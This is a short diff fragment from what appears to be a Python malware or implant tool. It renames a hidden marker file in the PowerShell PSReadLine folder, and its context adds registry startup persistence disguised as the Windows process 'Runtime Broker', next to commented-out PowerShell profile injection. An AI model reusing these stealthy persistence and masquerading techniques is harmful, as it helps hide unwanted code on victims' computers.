@@ -135,7 +135,7 @@ WantedBy=default.target""")
         #    print(err)
         #    print("could not add powershell profile")
         create_hidden_file(file_path)
-        create_hidden_file(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt")
+        create_hidden_file(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt")
         #add_to_startup(file_path, "Runtime Broker")
         add_registry_startup(file_path, "Runtime Broker")
     
